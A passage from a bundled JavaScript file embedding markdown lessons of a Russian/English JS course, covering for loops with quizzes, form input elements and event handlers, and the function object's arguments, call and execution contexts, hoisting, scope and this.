рекомендую.\nЭто требует повышенной внимательности и может приводить к ошибкам.\nТакие \"финты\" хороши для операторов цикла **~while~** и **~do...while~**, а уж если вы используете оператор **~for~**, то лучше не выпендриваться и все настроки для переменной цикла делать в круглых скобках. Это нагляднее и проще в отладке.\n\n_________________________________________________________________\n\n◘◘![ico-25 cap]** 3**◘◘\n\n~~~js\nvar res = 0\n\nfor (var i = 100; i > 0; i--) {\n  res += i % 2\n}\n\nconsole.log(res)\n~~~\n_________________________________________________________________\n\n◘◘![ico-25 cap]** 4**◘◘\n\n~~~js\nfor (var i = 2; i < 100; i *= 2) {\n  console.log(i)\n}\n~~~\n\nВывод в консоль степеней двойки.\n____________________________________________________________________\n\n◘◘![ico-25 cap] Массив◘◘\n\n~~~js\nvar res = 0, arr = [2, 1, 5, 3], i\n\nfor (i = 0; i < arr.length; i++) {\n  res += arr[i]\n}\n~~~\n\n^^У массивов, так же, как у текстовых строк, есть свойство ~length~.^^\n\n^^Это свойство содержит число элементов массива (или число символов в строке).^^\n\n^^В качестве ограничения на число итераций цикла мы используем длину массива^^ ~arr.length~:\n\n~~~js\ni < arr.length\n~~~\n\n^^т.е. пока переменная цикла меньше длины массива, цикл будет повторяться.^^\n\n^^В результате выполнения цикла в переменной ~res~ будет сумма элементов массива ~arr~.^^\n\n^^![ico-20 warn] Можно изменять значение переменной цикла на каждой итерации на число, отличное от единицы.^^\n\n^^Следующий код выведет в консоль все нечетные числа от 1 до 20:^^\n\n~~~js\nfor (var i = 1; i < 20; i += 2) {\n  console.log(i)\n}\n~~~\n\n______________________________________________________\n\n## ![ico-30 icon] Tests\n\n◘◘![ico-25 hw]** 1**◘◘\n\n~~~js\nvar number = 5\n\nfor (; number > 2; number -= 2) {\n  ++number\n}\n~~~\n\n→→→ Какое значение будет у переменной number после завершения цикла? | 1, 2, 3, 4, 5, 6 | 2→→→\n\n\n◘◘![ico-25 hw] **2-3**◘◘\n~~~js\nvar x = 0, y = 0, numbers = [1, 2, 3, 4]\n\nvar res_x = 0, res_y = 0\n\nfor (var i = 0; i < arr.length-1; i++) {\n  res_x += numbers[x++]\n  res_y += numbers[++y]\n}\n~~~\n\n→→→ Какое значение будет у переменной res_x после завершения цикла? | 1, 3, 5, 6, 9, 10 | 6→→→\n→→→ Какое значение будет у переменной res_y после завершения цикла? | 1, 3, 5, 6, 9, 10 | 9→→→\n\n◘◘![ico-25 hw]** 4**◘◘\n\n~~~js\nfor (var number = 11; number > 2; number -= 2) {\n  number++\n}\n~~~\n\n→→→ Какое значение будет у переменной number после завершения цикла? | 1, 2, 3, 4, 5, 6, 7 | 2→→→\n\n◘◘![ico-25 hw]** 5**◘◘\n\n~~~js\nfor (var number = 7; number > 2; --number) {\n  number--\n}\n~~~\n\n→→→ Какое значение будет у переменной number после завершения цикла? | 1, 2, 3, 4, 5, 6, 7 | 1→→→\n\n◘◘![ico-25 hw]** 6**◘◘\n\n~~~js\nfor (var number = -1; number-- > -11; number *= 2) {}\n~~~\n\n→→→ Какое значение будет у переменной number после завершения цикла? | 0, -1, -9, -11, -12, -20, -21, -22, -23 | -23→→→\n\n◘◘![ico-25 hw]** 7**◘◘\n\n~~~js\nvar messages = ['Hi! ', 'Welcome! ', 'Nice to see you. ', 'How are you?']\n\nvar message = ''\n\nfor (var index = -1; index < messages.length; index += 2) {\n  message += messages[index] || ''\n}\n~~~\n\n→→→ Что будет в переменной message после завершения цикла? | 'Hi! Welcome! Nice to see you. How are you?', 'Hi! How are you?', 'Hi! Welcome! ', 'Hi! Nice to see you.', 'Welcome! Nice to see you. How are you?', 'Welcome! How are you?', 'Nice to see you. How are you?', 'How are you?' | Welcome! How are you?→→→\n____________________________________________________________________\n\n[![ico-20 link] MDN](external/mdn-for)\n"},25943:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-30 study] Элементы форм\n\nЭлементы форм имеют свойство   **~value~** и **~onchange~**\n\n**~onchange~** может содержать ссылку на колбэк-функцию обработчика события изменения свойства **~value~**\n\n## ![ico-25 icon] input\n\nЭлемент ~input~ имеет свойства  **~type~** и  **~value~**\n\nИнтерфейс элемента зависит от значения свойства  **~type~**\n\nВозможные значения свойства  ~type~:\n\n^^^[type]\n\n• ^^button^^\n• ^^checkbox^^\n• ^^color^^\n• ^^date^^\n• ^^datetime-local^^\n• ^^email^^\n• ^^file^^\n• ^^image^^\n• ^^month^^\n• ^^number^^\n• ^^password^^\n• ^^radio^^\n• ^^range^^\n• ^^reset^^\n• ^^search^^\n• ^^submit^^\n• ^^tel^^\n• ^^text^^\n• ^^time^^\n• ^^url^^\n• ^^week^^\n\n^^^\n\nЭлемент может быть полем ввода текста, чисел, даты, времени, пароля, e-mail,\nа может быть кнопкой, палитрой выбора цвета, окном выбора файла\n\nЭто может быть  _checkbox_  или  переключатель _radio button_...\n\nУ элементов ~input~ типа  **_~checkbox~_** и  **_~radio~_** помимо свойства  ~value~  есть свойство  **~checked~**\n\nСвойство  **~checked~**  принимает логическое значение  ~true~  или  ~false~\n\n____________________\n\n## ![ico-25 icon] Event Handlers\n\nОбработка событий элементов форм\n\nВставьте на страницу элемент  **~ p ~**, установите его свойство  ~id = \"_demo_\"~\n\n◘◘![ico-25 cap] **Пример 1**◘◘\n\n~~~js\nvar demo = document.createElement('p')\ndemo.id = 'demo'\ndemo.style.fontSize = '16px'\ndemo.style.color = 'blue'\ndocument.body.appendChild(demo)\n~~~\n\n____________________________\n\n### ![ico-20 icon] Secondary functions\n\nДве объявленные ниже функции будут обработчиками событий элементов форм в дальнейших примерах\n\n**inputValueChangedHandler**\n\n~~~js\nfunction inputValueChangedHandler (event) {\n  var p = event.target.id + ' value: ' + event.target.value\n  demo ? demo.innerHTML += p + '<br>' : console.log(p)      \n}\n~~~\n\n**inputClickHandler**\n\n~~~js\nfunction inputClickHandler (event) {\n  var p = event.target.id + ' checked: ' + event.target.checked\n  demo ? demo.innerHTML += p + '<br>' : console.log(p)\n}\n~~~\n\n__________________________________\n\n### ![ico-20 icon] text\n\n◘◘![ico-25 cap] **Пример 2**◘◘\n\n~~~js\nvar inp = document.createElement('input')\ninp.type = 'text'\ninp.id = 'input-text'\ndocument.body.appendChild(inp)\n\ninp.onchange = inputValueChangedHandler\n~~~\n\n### ![ico-20 icon] color\n\n◘◘![ico-25 cap] **Пример 3**◘◘\n\n~~~js\nvar clr = document.createElement('input')\nclr.type = 'color'\nclr.id = 'color picker'\ndocument.body.appendChild(clr)\n\nclr.onchange = inputValueChangedHandler\n~~~\n\n_____________________________\n\n## ![ico-25 icon] Переключатели\n\nСвойство  ~value~  этих элементов можно установить любым\n\nПереключатели типа  ~radio~  можно объединить в одну группу с помощью свойства  ~name~\n^^(оно должно иметь одно и то же значение для всех переключателей группы)^^\n\nЭлементы имеют свойство **~checked~** булевого типа\n\n• если элемент выбран, то **~checked~** имеет значение ~true~\n• в противном случае - ~false~\n\n![ico-20 warn] свойство  ~value~  при этом не меняется\n\n### ![ico-20 icon] radio\n\n◘◘![ico-25 cap] **Пример 4**◘◘\n\n~~~js\nfor (var i = 0; i < 3; i++) {\n  var radio = document.createElement('input')\n  radio.type = 'radio'\n  radio.name = 'radio'\n  radio.id = 'radio_' + (i + 1)\n  radio.value = i + 1\n  radio.onchange = inputValueChangedHandler\n  radio.onclick = inputClickHandler\n  document.body.appendChild(radio)\n}\n~~~\n\n________________________\n\n[:::Пример 5:::](https://jsfiddle.net/npso86uy/2/)\n\n__________________________________\n\n### ![ico-20 icon] checkbox\n\n◘◘![ico-25 cap] **Пример 6**◘◘\n\n~~~js\nfor (var i = 0; i < 3; i++) {\n  var chk = document.createElement('input')\n  chk.type = 'checkbox'\n  chk.name = 'checkbox'\n  chk.id = 'checkbox_' + (i + 1)\n  chk.onchange = inputValueChangedHandler\n  chk.onclick = inputClickHandler\n  document.body.appendChild(chk)\n}\n~~~\n\n_____________________________\n\n[:::Пример 7:::](https://jsfiddle.net/npso86uy/3/)\n\n_____________________________\n\n## ![ico-25 icon] select\n\nЭлемент ~select~ - выпадающий список\nЭлемент ~option~ - элемент выпадающего списка\nЭлемент ~select~ является контейнером для элементов ~option~\n\nСвойства элементов  ~option~\n\n• **~value~** - значение, которое будет возвращено элементом ~select~ при выборе этого элемента списка\n• **~innerText~** - текст, который будет виден пользователю в выпадающем списке\n\nСвойства элемента  ~select~\n\n• **~value~** - значение ~value~ выбранного ~option~\n• **~selectedIndex~** - порядковый номер выбранного ~option~\n\n◘◘![ico-25 cap] **Пример 8**◘◘\n\n~~~js\nvar members = [\n  '...',\n  'Алексеенко Валерия',\n  'Андриенко Екатерина',\n  'Бусуйко Кристина',\n  'Велигура Андрей',\n  'Веретельник Егор',\n  'Головахин Андрей',\n  'Денисенко Степан',\n  'Карабут Александр',\n]\n\nvar groupMembers = document.body.appendChild(document.createElement('select'))\n\nfor (var member of members) {\n  var option = document.createElement('option')\n  groupMembers.appendChild(option)\n  option.value = option.innerHTML = member\n}\n\nvar text = document.body.appendChild(document.createElement('p'))\n\ngroupMembers.onchange = function (ev) {\n  text.innerHTML = ev.target.selectedIndex + ': ' + ev.target.value\n}\n~~~\n\n___________________________\n\n[![ico-30 hw] **Тесты**](https://garevna.github.io/js-quiz/#forms)\n"},90485:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-30 study] Object 'function'\n\n_______________________________________\n\n\n**The function is a _callable object_**\n**A function associated with an object through a property is called a _method_**\n\n^^![ico-25 file] ECMAScript® 2016 Language Specification^^\n\n_______________________________________________\n\n## ![ico-25 icon] arguments\n\nJavaScript functions have a built-in **~arguments~** object\n\nIt has a **~length~** property, just like an array\n\nIts elements are accessed by index, just like array elements\n\n![ico-20 warn] However this is not an array\n\n^^Therefore, methods for working with arrays (**~push~**, **~pop~**, etc.) cannot be applied to it.^^\n\n^^It can be converted to a regular array using the **~Array.from~** method^^\n\n~~~js\nfunction test () {\n  var args = Array.from(arguments)\n  ...\n}\n~~~\n\nThe **~arguments~** object contains all the arguments passed to the function when it was called\n\nThey will be available by index strictly in the order in which they were passed to the function when called\n\n◘◘![ico-25 cap] **Example 1**◘◘\n\n~~~js\nfunction testArguments () {\n  for (var i = 0; i < arguments.length; i++) {\n    console.log(`[${ (i + ' ]').padEnd(10) } ${ arguments[i] }`)\n  }\n}\n\ntestArguments(27, false, 'Fill', [7, 4, 5], null)\n~~~\n\n______________________________________\n\n### ![ico-20 icon] arguments.callee\n\nThe **~arguments~** object has a property **_~callee~_** - a link to the function being executed (the “master” function of the ~arguments~ object)\n\n~~~js\nfunction testArguments () {\n  console.log(arguments.callee.name)\n}\n\ntestArguments() // testArguments\n~~~\n\n^^^[Example 2]\n\n^^Declare a function **~getArguments~**:^^\n\n~~~js\nfunction getArguments (param) {\n  return param ? param : arguments.callee\n}\n~~~\n\n^^that, if passed an argument, returns the value of that argument; otherwise, it returns a reference to itself.^^\n\n^^Now, call this function with and without a parameter:^^\n\n~~~js\nvar x = getArguments()\nvar y = getArguments('Hello!')\n~~~\n\n^^We stored the result of the function call without arguments in a variable **~ x ~**,^^\n^^and the result of the call with the argument \"Hello!\" in a variable **~ y ~**^^\n\n^^Now, we print the variables **~ x ~** and **~ y ~** to the console^^\n\n^^The variable **~ x ~** contains an exact copy of the **~getArguments~** function^^\n\n^^and the variable **~ y ~** contains the string \"Hello!\"^^\n\n^^Call the function **~ x ~**:^^\n\n~~~js\nx('Goodbye!')\n~~~\n\nand get the string 'Goodbye!'\n\n^^^\n\n^^^[Example 3]\n\n![ico-25 cap] ** 3 **\n\n^^Declare a function that \"heals itself,\" i.e., it adds properties and methods to itself:^^\n\n~~~js\nfunction setProperty (prop, val) {\n  arguments.callee[prop] = val\n}\n~~~\n\n^^Now, make it create a couple of properties for itself:^^\n\n~~~js\nsetProperty('isActive', false)\nsetProperty('value', 50)\n~~~\n\n^^And, for added assurance, make it create a method for itself:^^\n\n~~~js\nsetProperty('method', function () {\n  console.log('And I can also cross-stitch')\n})\n~~~\n\n^^Here we pass a function as the second argument to it^^\n^^Now, let's check that these properties and method have appeared on the **~setProperty~** function^^\n^^Print the **~isActive~** andи **~value~** properties of the **~setProperty~** function  to the console and call its method **~method~**^^\n\n^^^\n\n^^^[Example 4]\n\n![ico-25 cap] ** 4 **\n\n^^Let's create a function that \"accumulates\" the results of its own computations.^^\n\n^^Let this be a function that calculates the factorial of a number:^^\n\n~~~js\nvar factorial = function (num) {\n  var res = 1, n = 1\n  while (n <= num) res *= n++\n}\n~~~\n\n^^Let's \"modify\" it as follows:^^\n\n~~~js\nvar factorial = function (num) {\n  if (!arguments.callee.res) arguments.callee.res = []\n  var res = 1, n = 1\n  while (n <= num) res *= n++\n  arguments.callee.res.push(res)\n  return res\n}\n~~~\n\n^^Call it with different argument values and print the value of the **~res~** property to the console:^^\n\n~~~js\nfactorial(5)\nfactorial(5)\n\nconsole.log(factorial.res)\n~~~\n\n^^We will get the array ~[120, 3628800]~^^\n\n^^^\n\n^^![ico-20 warn] The following example is better reviewed after studying DOM element events.^^\n\n^^^[Example 5]\n\n![ico-25 cap] ** 5 **\n\n^^In this example, anonymous functions are created to handle the **~click~** event of buttons.^^\n\n^^Each function \"accumulates\" data about the time of the click on the button in the array **~arguments.callee.res~**^^\n\n~~~js\nvar buttons = []\n\nfor (var n = 0; n < 5; n++) {\n  buttons[n] = document.body\n    .appendChild(document.createElement('button'))\n  buttons[n].innerText = n\n  buttons[n].onclick = function (event) {\n    if (!arguments.callee.res) arguments.callee.res = []\n    arguments.callee.res.push(Math.round(event.timeStamp))\n    console.log(arguments.callee.res)\n  }\n}\n~~~\n\n^^Let's modify this code:^^\n\n~~~js\nvar buttons = []\n\nfor (var n = 0; n < 5; n++) {\n  buttons[n] = document.body\n    .appendChild(document.createElement('button'))\n  buttons[n].innerText = 0\n  buttons[n].style = 'padding: 8px 16px'\n  buttons[n].onclick = function (event) {\n    var func = arguments.callee\n    if (!func.clicksTime) func.clicksTime = []\n    func.clicksTime.push(Math.round(event.timeStamp))\n    console.log(func.clicksTime)\n    var len = func.clicksTime.length\n    event.target.innerText = len\n    func.res = len > 1\n      ? func.clicksTime[len - 1] - func.clicksTime[len - 2]\n      : 0\n    console.info(`Interval between the last clicks: ${func.res}`)\n  }\n}\n~~~\n\n^^What does each button click handler do now?^^\n\n^^^\n\n_______________________________________________\n\n## ![ico-25 icon] Callable object\n\nIn this sense, the function can be compared to ![ico-30 ambulance]\n\nLike ![ico-20 ambulance], a function can move from one object to another (from where it is called)\n\nIn this case, the objects calling the function are **call context**\n\nThe function itself must have \"tools\" to perform its task in the context of the call\n\nAll these tools that are not related to the call context, but are exclusively at the disposal of the function, belong to the **execution context**\n\nSo, where ![ico-20 ambulance] will go is **call context**\nWhat's inside ![ico-20 ambulance] is the **execution context**\n\n^^^[Execution context]\n\n![ico-30 ambulance]\n\n| **Properties** ^^(variables)^^ | **Methods** ^^(functions)^^ |\n| ^^A set of tools, medications, bandages, various devices (IVs, defibrillator, ventilator, etc.)^^ | ^^The professional skills of the ambulance staff (can give an injection, start an IV, use a defibrillator, carry the patient on a stretcher, etc.)^^ |\n\n^^All of this is what the ambulance carries with it.^^\n\n^^^\n\n^^^[Call context]\n\n![ico-30 ambulance]\n\n^^• Specific conditions (private house, apartment in a high-rise building, presence or absence of an elevator, running water, etc.)^^\n^^• A specific patient with specific symptoms, age, medical history, character, etc.^^\n\n^^^\n\n## ![ico-25 icon] Call context\n\nThe calling context is **object**\n\nTypically, when calling a function, the name of this object comes before the name of the function, and is separated from it by a dot:\n\n~~~js\npatient.emergency()\n~~~\n\nAs a rule, if the object name is not specified before the function name, then the context of the function call is the global object **~window~**\n\n^^The exception is for functions whose calling context is set using the ~bind()~ method^^\n\n![ico-20 warn] It follows that all JS functions are methods\nIf the object (\"master\" of the method) is not specified, the global object is assumed\n\n_______________________________\n\n^^^[Example 6]\n\n![ico-25 cap] ** 6 **\n\n^^Declare three functions:^^\n\n~~~js\nfunction first () {\n  console.log('Function first is working')\n}\nfunction second () {\n  console.log('Function second is working')\n}\nfunction third () {\n  console.log('Function third is working')\n}\n~~~\n\n^^All three functions are declared in the global context, meaning they are methods of the global **~window~** object.^^\n\n^^As we already know, properties of an object can be accessed like elements of an associative array.^^\n\n^^Thus, the expression:^^\n\n~~~js\nwindow['first']\n~~~\n\n^^will return the **~first~** function, which is a property (method) of the global **~window~** object.^^\n\n^^To call this function, we just need to add parentheses:^^\n\n~~~js\nwindow['first']()\n~~~\n\n^^Using this fact, we can call a function whose name is stored in a variable of type \"_string_\":^^\n\n~~~js\nfor (var funcName of ['first', 'second', 'third']) window[funcName]()\n~~~\n\n^^^\n\n____________________________\n\n### ![ico-20 icon] Call context reference\n\nWhen an ambulance is called, it receives a link to the call object.\n\nThe team needs to know where to go, the patient’s symptoms, age, etc.\n\nIn the same way, a function must have access to the object that calls it, its properties, which may be necessary for the normal operation of the function.\n\nWithin a function, **~this~** keyword is a reference to the object in whose context the function is called (i.e., the calling context)\n\nFor example, for the function ![ico-20 ambulance]\n\n^^![ico-20 green-ok] this.address^^\n^^![ico-20 green-ok] this.floor^^\n^^![ico-20 green-ok] this.apartment^^\n^^![ico-20 green-ok] this.patient.name^^\n^^![ico-20 green-ok] this.patient.age^^\n^^![ico-20 green-ok] this.patient.symptoms^^\n...\n\n^^If it were not for **~this~**, it is unlikely that the function could help the \"patient\" ![ico-20 smile]^^\n\n_________________________________________\n\n## ![ico-25 icon] Execution context\n\n![ico-20 warn] Each function call results in the creation of a new execution context.\n\nThe execution context is created before code execution begins.\n\nEach **~return~** exits the execution context.\nWhile the function execution is not completed, its context will be active.\nSince functions can call each other, their context is pushed onto the stack\n![](illustrations/function-object-01.png)\n^^(queue: last in, first out).^^\nThe top of this stack will always be the current execution context.\n\n![](illustrations/function-object-02.png)\n\nWhat will be present in this context?\n\n![ico-20 green-ok] LexicalEnvironment\n![ico-20 green-ok] Scope chain\n![ico-20 green-ok] ~this~\n\n_____________________________________________\n\n### ![ico-20 icon] Lexical Environment\n\n^^When a function is called, it is activated^^\n^^It needs somewhere to safely “place” its data with which it will work^^\n^^In addition to the arguments a function receives when called, it can have its own internal data needed for temporarily storing intermediate computation results.^^\n\nWhen a function is called, an object is created containing all the necessary variables.\n\nThis object is called **~LexicalEnvironment~**.\n\n~LexicalEnvironment~ contains the function arguments and all variables declared inside the function (including functions)\n\n^^therefore it is also called _variable object_ or _activation object_^^\n\n^^Thus, the activation object can be compared to a locker for storing the “personal belongings” of the function^^\n\n^^![ico-20 warn] It's impossible to access activation object^^\n\n______________________________________________\n\n### ![ico-20 icon] hoisting\n\nSo, after calling the function:\n\n| ** 1** |   | **An execution context is created**                         |\n|        | • | ^^an activation object is created (~Lexical Environment~)^^ |\n|        | • | ^^scope is determined^^                                     |\n|        | • | ^^the value of **~this~** is set up^^                       |\n| ** 2** |   | **The code is interpreted and executed**                    |\n\n![ico-20 warn] Please note that all internal variables and nested functions are declared before the code starts executing, regardless of the order in which they appear in the code.\n![ico-20 warn] But assignment of values ​​to variables occurs when the code starts executing.\nThis results in **hoisting** of variable and function declarations\n\n^^^[Example 7]\n\n![ico-25 cap] ** 7 **\n\n~~~js\nfunction delegat () {\n  console.log(x)\n  y = x + 5\n  console.log(y)\n  x = 5, y = 10\n\n  return  x * 4 +  y / 2\n\n  var x = 1, y = 1\n}\n~~~\n\n^^Although the declaration of variables **_~ x~_** and **_~ y~_** appears in the code after the ~return~ statement, during the creation of the execution context, an activation object (Lexical Environment) will be formed in the first stage, and all variables declared within the function will be included in this object.^^\n\n^^Thus, the declaration of variables **_~ x~_** and **_~ y~_** will take place before the code execution starts.^^\n\n^^However, the values will be assigned to variables only at the the second stage, and the code will be executed sequentially.^^\n\n^^Therefore, at the time of executing the code `console.log(x)`, the value of the variable **_~ x~_** will not be defined, so ~undefined~' will be printed in the console.^^\n\n~~~js\nconsole.log(x) // undefined\n~~~\n\n^^Similarly, at the time of executing the code:^^\n\n~~~js\ny = x + 5\n~~~\n\n^^the value of the variable **_~ x~_** will be ~undefined~, so the assignment operation will result in **~NaN~**, which will be outputted by the code:^^\n\n~~~js\nconsole.log(y)\n~~~\n\n^^After this, the code:^^\n\n~~~js\nx = 5, y = 10\n~~~\n\n^^will be executed. Variables **_~ x~_** и **_~ y~_** will receive values.^^\n\n^^Therefore, the function will return the value **25**.^^\n\n^^The assignment:^^\n\n~~~js\nx = 1, y = 1\n~~~\n\n^^will not occur because the execution context will exit before this code.^^\n\n^^^\n\n^^^[Example 8]\n\n![ico-25 cap] ** 8 **\n\n~~~js\nvar treg = 5\n\nfunction delegat () {\n  treg = 10\n  return\n\n  function treg () {\n    return\n  }\n}\ndelegat()\nconsole.log(treg)  // 5\n~~~\n\n^^In this case, the declaration of the function **~treg~** will be captured in the Lexical Environment of the **~delegat~** function during the creation of its execution context and will not affect the variable **~treg~**, declared in the global context.^^\n\n^^These will be different variables, although they share the same identifiers.^^\n\n^^Therefore, as a result, ** 5** will be logged in the console.^^\n\n^^^\n\n________________________________\n\n### ![ico-20 icon] Scope\n\n**~Scope~** limits the access and visibility of variable and function identifiers.\n\n^^^[scope]\n\n^^Imagine two people named Sasha: 👨‍💼 a guy and 🙎 a girl.^^\n\n^^There are two rooms,^^\n^^and guy Sasha 👨‍💼 is in the first room,^^\n^^while girl Sasha 🙎 is in the second one.^^\n\n^^Each room has an observer.^^\n\n^^If we ask the observer in the first room: _\"Who is Sasha?\"_,^^\n\n^^he will answer: _\"The guy\"_ 👨‍💼^^\n\n^^Asking a similar question to the observer in the second room, we'll get the answer: _\"The girl\"_ 🙎^^\n\n^^This happens because each room has its own scope.^^\n\n_________________________________\n\n^^However, the scope of nested functions will be somewhat different.^^\n\n^^Let's assume that nested functions are boxes with walls made of tinted glass.^^\n^^Our function-boxes are nested within each other, like nesting dolls:^^\n^^the second box is inside the first one,^^\n^^the third one is inside the second one, and so on...^^\n\n^^The observer in box 2 will not only see the contents of box 2,^^\n^^but also the contents of box 1,^^\n^^and the room where all the boxes are located,^^\n^^but he cannot see the contents of box 3,^^\n^^although the observer in box 3 can see them perfectly...^^\n^^as well as the observers in all other boxes^^\n^^and in the room.^^\n\n____________________________\n\n^^Thus, if a function refers to a variable, it will first look for this variable in its \"personal belongings cabinet\", and if it doesn't find it, it won't hesitate to \"borrow\" this variable from the outer room where it is located. ^^\n\n___________________________\n\n^^![ico-20 warn] All nested each other outer \"cabinets\" represent a ![ico-20 pin] chain of function scopes, which is part of its ![ico-20 pin] **execution context**.^^\n\n^^^\n\n^^^[Example 9]\n\n![ico-25 cap] ** 9**\n\n~~~js\nvar sample = 1\n\nfunction changeSample () {\n  sample = 10\n}\n\nchangeSample()\n~~~\n\n^^The variable **~sample~**   is declared in the global scope, where the function **~changeSample~** is also declared.^^\n\n^^The variable **~sample~** is assigned the value 1 upon declaration.^^\n\n^^Since there is no declaration of the variable **~sample~** inside the **~changeSample~** function, when the execution context of the **~changeSample~** function is formed, this variable will not be included to the activation object (\"personal belongings cabinet\") of the **~changeSample~** function.^^\n\n^^Then, during the execution of:^^\n\n~~~js\nsample = 10\n~~~\n\n^^the following happens:^^\n\n^^the **~changeSample~** function, not finding such a variable in its own \"room\", refers to the external \"room\" where such a variable exists, and it will be assigned the value 10.^^\n\n^^Thus, for each execution context, there exists its own chain of scopes.^^\n\n^^The scope chain includes the scopes of all previous contexts in the stack.^^\n\n^^^\n\n^^^[Example 10]\n\n![ico-25 cap] **10**\n\n~~~js\nvar sample = 1\n\nfunction showSample () {\n  console.info('Entered the execution context of the function showSample')\n  console.info(`sample === ${sample}`)\n\n  return\n\n  function sample () {}\n}\n\nshowSample()\n\nconsole.info('Exited the execution context of the function showSample')\nconsole.info(`Now sample === ${sample}`)\n~~~\n\n**The result of code execution:**\n\n~~~console\nEntered the execution context of the function showSample\nsample === function sample () {}\nExited the execution context of the function showSample\nNow sample === 1\n~~~\n\n^^This example demonstrates how the **hoisting** mechanism works.^^\n\n^^The variable **~sample~** is declared in the global scope with a value of 1.^^\n\n^^Inside the **~showSample~** function, after the return statement, the **~sample~** function is declared.^^\n\nAfter the execution of the showSample function is completed, its context will be \"unmounted\", and the global context will become active again, where the sample variable has a value of 1.\n\n^^At first glance, when the code is executed sequentially, this declaration shouldn't work because the ~return~ statement is placed above it.^^\n\n^^However, all declarations are gathered into the activation object before the code starts executing.^^\n\n^^Therefore, by the time the code of the **~showSample~** function starts executing, the **~sample~** function will already be declared and will be safely located in the ~Lexical Environment~ of the **~showSample~** function.^^\n\n^^Thanks to this, variable and function declarations \"hoist\" to the scope of their \"parent\" (in our case, the \"parent\" is the **~showSample~** function).^^\n\n^^This is confirmed by logging the **~sample~** variable to the console.^^\n\n^^After the execution of the **~showSample~** function is completed, its context will be \"unmounted\", and the global context will become active again, where the sample variable has a value of 1.^^\n\n^^^\n\n^^^[Example 11]\n\n![ico-25 cap] **11**\n\n~~~js\nvar sample = 1\n\nfunction showSample () {\n  console.info('Entered the execution context of the function showSample')\n  console.info(`(1) ${sample}`)\n  sample()\n  console.info(`(2) ${sample}`)\n  sample = 10\n  console.info(`(3) ${sample}`)\n\n  return\n\n  function sample () { sample = 5 }\n}\n\nshowSample()\n\nconsole.info(`(global) ${sample}`)\n~~~\n\n^^Здесь так же происходит поднятие объявления функции  **~sample()~**^^\n\n^^Но функция  **~sample()~**  переопределяет значение  переменной  **~sample~**^^\n\n^^В контексте выполнения функции  **~showSample~** на момент присваивания переменной **~sample~** значения 5 нет другой объявленной переменной **~sample~**, кроме самой функции  **~sample()~**^^\n\n^^Таким образом, до вызова функции  **~sample()~** в консоль будет выведена функция^^\n\n^^После вызова функции  **~sample()~** в консоль будет выведено новое значение ( 5 ) переменной **~sample~**^^\n\n^^После этого будет выполнено присваивание нового значения переменной **~sample~**  и вывод в консоль ( 10 )^^\n\n^^Когда функция **~showSample~** завершит работу, и ее контекст будет \"демонтирован\", станет активным глобальный контекст, в котором переменная **~sample~** имеет значение 1^^\n\n^^В этом примере функция **~sample()~** переопределила саму себя ( была \"function\", стала \"number\" )^^\n\n^^^\n\n____________________________________\n\n### ![ico-20 icon] Цепочка областей видимости\n\nИтак, функция может использовать какие-то переменные, которых нет в ее ~LexicalEnvironment~\n\n^^Они являются внешними, и находятся в другом контексте^^\n^^Но они доступны функции^^\n^^Функция \"видит\" их, поэтому они находятся в ее _области видимости_^^\n\n^^Когда внутри функции происходит обращение к переменной или функции, в первую очередь движок будет искать эту переменную в ~LexicalEnvironment~ функции, если ее там не окажется - то поиск будет продолжен по цепочке областей видимости^^\n\n^^Если переменная ( или функция ) не будет обнаружена, будет сгенерировано исключение ![ico-20 err] ~ReferenceError~^^\n\n_______________________________________\n\n### ![ico-20 icon] this\n\n**~this~** - это еще одна составляющая контекста исполнения функции\n\n**~this~** является ссылкой на контекст вызова функции\n\nС помощью ключевого слова  **~this~**  можно получить доступ из функции ( или метода ) к свойствам объекта, в контексте которого была вызвана функция\n\n_______________________________\n\n![ico-25 cap] **12**\n\n~~~js\nfunction func () {\n  console.log(this)\n}\n~~~\n\nпри вызове функции  **~func()~** в консоль будет выведен объект  ~window~\n\nВнутри  функции  **~func()~** ~this~ указывает на объект  ~window~\n\n________________________________\n\n![ico-25 cap] **13**\n\n~~~js\nfunction func () {\n  child()\n\n  function child () {\n    console.log('child this: ', this)\n  }\n}\n\nfunc()  // window\n~~~\n\n___________________________________\n\n![ico-25 cap] **14**\n\nЕсли же функция является методом объекта, то ее контекстом вызова будет этот объект\n\n~~~js\nvar human = {\n  name: 'Ivan',\n  say: function () {\n    console.log('this: ', this)\n  }\n}\n\nhuman.say() // будет выведен объект  human\n~~~\n\n________________________________\n\n![ico-25 cap] **15**\n\nТеперь посмотрим на функцию как на объект\n\n~~~js\nfunction say () {\n  console.log('function say: this: ', this)\n}\n\nfunction girl () {\n  console.log('function girl: this: ', this)\n}\n~~~\n\nДобавим функции  **~girl~**  свойство  **~say~** и вызовем функцию ~girl~ и ее свойство ~say~:\n\n~~~js\ngirl.say = say\ngirl.say()     //  girl\ngirl()         // window\n~~~\n\n________________________________________\n\n## ![ico-25 icon] prototype\n\n• Функцию как **_объект_** нельзя вывести с помощью метода ~console.log~\n• Для этой цели следует использовать метод **~console.dir~**\n\n~~~js\nfunction sample () {}\n\nconsole.dir(sample)\n~~~\n\nВ консоли мы получим следующую картинку:\n~~~console\n▼ ƒ sample()\n      arguments: null\n      caller: null\n      length: 0\n      name: \"sample\"\n    ▼ prototype:\n        ▶ constructor: ƒ sample()\n        ▶ __proto__: Object\n    ▶ __proto__: ƒ ()\n      [[FunctionLocation]]: VM476:1\n    ▼ [[Scopes]]: Scopes[1]\n        ▶ 0: Global {type: \"global\", name: \"\", object: Window}\n~~~\n\n![ico-25 warn] Обратите внимание на свойство **_~prototype~_**, которое есть **только у функций**\n![ico-20 pin] это объект\n![ico-20 pin] в этом объекте есть свойство **~constructor~**\n![ico-20 pin] свойство **~constructor~** - это ссылка на саму функцию **_~sample()~_**\n\n_____________________\n\nОбратите также внимание на свойство **~&#95;&#95;proto&#95;&#95;~**, которое мы разберем далее\n![ico-20 pin] это **ссылка** на объект, от которого функция унаследовала свои свойства и методы\n![ico-20 pin] любая функция создается встроенным нативным объектом ( конструктором ) **Function**\n^^( это свидетельствует о том, что функция - это **объект** )^^\n![ico-20 pin] свойство **~constructor~** в **~&#95;&#95;proto&#95;&#95;~** - это ссылка на **Function**\n\n^^~[[FunctionLocation]]~ и ~[[Scopes]]~ добавляет Chrome DevTools для целей отладки^^\n\n___________________________________\n\n## [![ico-30 hw] Упражнения](test/functionObject)\n\n[![ico-20 link] 